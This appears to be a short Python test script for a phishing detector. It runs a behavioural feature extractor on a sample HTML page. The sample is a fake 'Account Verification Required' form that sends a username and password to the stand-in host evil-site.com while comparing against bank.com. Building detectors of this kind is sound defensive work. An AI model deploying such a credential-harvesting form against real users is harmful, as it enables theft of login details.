from behavioral_features import extract_behavioral_features

sample_html = """
<html>
  <body>
    <h2>Account Verification Required</h2>
    <form action="http://evil-site.com/submit">
      <input type="text" name="user">
      <input type="password" name="pass">
      <input type="hidden" value="track">
      <input type="submit">
    </form>
  </body>
</html>
"""

features = extract_behavioral_features(sample_html, "https://bank.com")
print(features)
